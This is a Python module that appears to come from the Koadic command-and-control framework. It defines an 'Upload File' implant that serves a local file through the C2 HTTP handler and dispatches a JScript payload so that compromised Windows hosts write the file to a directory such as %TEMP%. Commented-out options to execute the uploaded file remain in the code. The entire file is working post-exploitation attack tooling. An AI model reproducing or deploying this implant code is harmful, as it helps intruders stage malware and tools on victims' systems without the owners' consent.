import core.job
import core.implant
import uuid

class UploadFileJob(core.job.Job):
    def report(self, handler, data):
        if handler.get_header('X-UploadFileJob', False):
            with open(self.options.get("LFILE"), "rb") as f:
                fdata = f.read()

            headers = {}
            headers['Content-Type'] = 'application/octet-stream'
            headers['Content-Length'] = len(fdata)
            handler.reply(200, fdata, headers)
            return

        super(UploadFileJob, self).report(handler, data)

    def done(self):
        self.results = self.data

    def display(self):
        pass

class UploadFileImplant(core.implant.Implant):

    NAME = "Upload File"
    DESCRIPTION = "Uploads a local file the remote system."
    AUTHORS = ["RiskSense, Inc."]

    def load(self):

        self.options.register("LFILE", "", "local file to upload")
        #self.options.register("FILE", "", "file name once uploaded")
        #self.options.register("EXEC", "false", "execute file?", enum=["true", "false"])
        #self.options.register("OUTPUT", "false", "get output of exec?", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory", required=False)

    def job(self):
        return UploadFileJob

    def run(self):
        # generate new file every time this is run
        #self.options.set("FILE", uuid.uuid4().hex)

        if not self.options.get("FILE"):
            self.options.register("FILE", "", "", hidden = True)

        last = self.options.get("LFILE").split("/")[-1]
        self.options.set("FILE", last)
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

        payloads = {}
        #payloads["vbs"] = self.load_script("data/implant/util/upload_file.vbs", self.options)
        payloads["js"] = self.loader.load_script("data/implant/util/upload_file.js", self.options)

        self.dispatch(payloads, self.job)
